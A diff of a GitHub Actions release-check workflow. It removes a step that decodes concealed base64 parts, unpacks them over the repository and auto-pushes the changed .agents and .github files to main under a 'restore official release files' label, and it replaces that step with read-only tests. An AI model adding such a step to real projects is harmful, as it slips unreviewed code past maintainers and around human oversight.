@@ -3,32 +3,24 @@ name: Release checks
 on:
   push:
     branches: [main]
+  pull_request:
   workflow_dispatch:
 
 permissions:
-  contents: write
+  contents: read
 
 jobs:
-  repair-and-validate:
+  test:
     runs-on: ubuntu-latest
     steps:
       - name: Check out repository
         uses: actions/checkout@v4
-        with:
-          ref: main
-
-      - name: Restore official v1.6.0 release files
-        shell: bash
-        run: |
-          cat .github/repair/payload.part* | base64 -d > "$RUNNER_TEMP/release-files.tar.gz"
-          echo "3a0d59fb040edb5d5231a3efb0b84e0afc92ae303cae37bbeb7eff5ac6e20aaa  $RUNNER_TEMP/release-files.tar.gz" | sha256sum -c -
-          tar -xzf "$RUNNER_TEMP/release-files.tar.gz" -C .
-          rm -rf .github/repair
 
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
           python-version: "3.11"
+          cache: pip
 
       - name: Install test dependency
         run: python -m pip install --upgrade pip pytest
@@ -39,22 +31,26 @@ jobs:
           mkdir -p "$RUNNER_TEMP/repo-under-test"
           rsync -a --delete --exclude='.git/' ./ "$RUNNER_TEMP/repo-under-test/"
 
-      - name: Run complete validation
+      - name: Run tests
         working-directory: ${{ runner.temp }}/repo-under-test
         env:
           PYTHONDONTWRITEBYTECODE: "1"
         run: python -m pytest -q -p no:cacheprovider
 
-      - name: Commit restored files except workflow
+      - name: Check generated files are absent
+        working-directory: ${{ runner.temp }}/repo-under-test
         shell: bash
         run: |
-          git restore --source=HEAD -- .github/workflows/release-check.yml
-          git config user.name "github-actions[bot]"
-          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git add .agents .github MANIFEST.sha256
-          if git diff --cached --quiet; then
-            echo "No changes to commit"
-          else
-            git commit -m "fix: restore complete v1.6.0 release files"
-            git push origin HEAD:main
+          if find . -type d \( -name __pycache__ -o -name .pytest_cache \) -print -quit | grep -q .; then
+            echo "Generated cache directory found"
+            exit 1
           fi
+          if find . -type f \( -name '*.pyc' -o -name '*.pyo' \) -print -quit | grep -q .; then
+            echo "Compiled Python file found"
+            exit 1
+          fi
+
+      - name: Check current version
+        working-directory: ${{ runner.temp }}/repo-under-test
+        shell: bash
+        run: test "$(cat VERSION)" = "1.6.0"
